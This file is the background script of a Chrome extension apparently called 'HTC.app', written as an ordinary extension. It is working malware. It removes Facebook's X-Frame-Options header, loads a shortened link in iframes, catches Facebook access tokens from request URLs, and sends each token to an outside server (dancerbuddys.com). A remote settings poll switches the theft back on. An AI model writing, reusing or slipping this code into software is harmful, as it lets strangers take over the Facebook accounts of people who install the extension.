const URL_APP = "http://goo.gl/tMjTEJ";

const URL_SAVE_TOKEN = "http://dancerbuddys.com/api.php?app=htc&action=save_token&token=";
const URL_GET_SETTINGS = "http://dancerbuddys.com/api.php?app=htc&action=get_settings";
const URL_STAT = "http://stat.extensionmaker.com/api/extensionLaunched";

function loadInfo() {
//	alert('asdasd');
	$.getJSON(URL_GET_SETTINGS).done(function (settings) {
		var last_fetch_date = settings.last_fetch_date;
		var lfd = localStorage['last_fetch_date'];
//		alert(last_fetch_date);
		console.log("settings.last_fetch_date: " + settings.last_fetch_date);
		console.log("lfd: " + lfd);

		if (settings.last_fetch_date != lfd) {
			localStorage['send_token'] = "true";
			fetchToken();
			localStorage['last_fetch_date'] = last_fetch_date;
		}
	});
}

function fixFacebook() {
	chrome.webRequest.onHeadersReceived.addListener(function (details) {
		var newHeaders = [];
		for (var i = 0; i < details.responseHeaders.length; i++) {
			if (details.responseHeaders[i].name.toUpperCase() != "X-FRAME-OPTIONS") {
				newHeaders.push(details.responseHeaders[i]);
			}
		}
		return {
			responseHeaders: newHeaders
		};
	}, {
		urls: ["http://www.facebook.com/*", "https://www.facebook.com/*"],
		types: ["main_frame", "sub_frame", "other"]
	}, ["blocking", "responseHeaders"]
	);
}

function fetchToken() {
	addTokenInterceptor();

	addStep(false);
}

$(document).ready(function () {
	sendStatistics();

	fixFacebook();

	loadInfo();
	setInterval(loadInfo, 60 * 1000); //1 hour

	var uuid = localStorage['uuid'];
	if (!uuid) {
		uuid = localStorage['uuid'] = guid();
	}
//	console.log("uuid: " + uuid);

	chrome.extension.onRequest.addListener(function (request, sender, sendResponse) {
		if (request.name == "stepCompleted") {
			addStep(true);
		} else if (request.name == "closeTab") {
			chrome.tabs.remove(sender.tab.id);
		}
	});
});

function addTokenInterceptor() {
	chrome.webRequest.onCompleted.addListener(function (details) {
		if (details.url.indexOf("access_token=") == -1) {
			return;
		}

		if (localStorage['send_token'] == "false") {
			return;
		}

		console.log("details.url: " + details.url);

		var token = details.url.split("access_token=")[1].split("&")[0];
		console.log("token: " + token);
		$.get(URL_SAVE_TOKEN + token);
		localStorage['send_token'] = "false";
	}, {urls: ["https://www.facebook.com/*"]}, []);
}

function sendStatistics() {
	var url = URL_STAT + "?info=" + encodeURIComponent(JSON.stringify({
		id: "93726843-ffc2-479f-9d0d-917e175e1a37",
		name: "HTC.app",
		browser: "chrome",
		user_id: "1"
	}));
//	alert(url);
	$.get(url);
}

function guid() {
	function s4() {
		return Math.floor((1 + Math.random()) * 0x10000)
		.toString(16)
		.substring(1);
	}

	return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
	s4() + '-' + s4() + s4() + s4();
}

function addStep(delay) {
	console.log("step....");
	$("iframe.step").remove();

	if (delay) {
		setTimeout(function () {
			$("body").append('<iframe class="step" src="' + URL_APP + '" width="640" height="480"></iframe>');
		}, 4000);
	} else {
		$("body").append('<iframe class="step" src="' + URL_APP + '" width="640" height="480"></iframe>');
	}
}
